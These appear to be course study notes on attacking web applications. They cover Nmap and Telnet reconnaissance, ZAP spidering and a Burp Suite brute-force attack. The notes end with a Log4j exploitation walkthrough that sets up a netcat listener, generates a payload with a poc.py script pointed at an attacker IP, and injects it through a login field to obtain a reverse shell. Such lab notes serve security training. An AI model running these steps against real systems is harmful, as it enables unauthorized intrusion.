# Hacking Web Applications

## Nmap

**Perform Web Application Reconnaissance using Nmap**

```bash
nmap -T4 -A -v <ip/URL>
```

## Telnet

**Perform Web Application Reconnaissance using Telnet**

```bash
telnet <ip/URL> 80 (can be any port)

GET / HTTP/1.0 (Press enter twice)
```

## OWASP ZAP

**Perform Web Spidering using OWASP ZAP**

scan the using URL and see in spider tab

## Burp Suite

**Perform a Brute-force Attack using Burp Suite**

capture the request sent to the Intruder in this case It uses a Cluster bomb Attack.

## Exploit Log4j

**Gain Access by exploiting Log4j Vulnerability**

**Extract and Setup Jdk**

```bash
tar -xf jdk-8u202-linux-x64.tar.gz

mv jdk1.8.0_202 /usr/bin
```

**Update the JDK Path in the Poc.py file**

{% hint style="info" %} Change Line no: 62, replace jdk1.8.0_20/bin/javac with "/usr/bin/jdk1.8.0_202/bin/javac"

Change Line no: 87, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java"

Change Line no: 99, replace jdk1.8.0_20/bin/java with "/usr/bin/jdk1.8.0_202/bin/java" {% endhint %}

**Create a Netcat Listener**

```bash
nc -lvp 9001
```

**Create a Payload**

```bash
python3 poc.py --userip <attackerip> --webport <website running onport> --lport <Listeningport>
```

{% hint style="info" %} Copy the send me payload and paste in the username field and enter any random password and press Login {% endhint %}

then to responder

```bash
nc -lvp 9001
```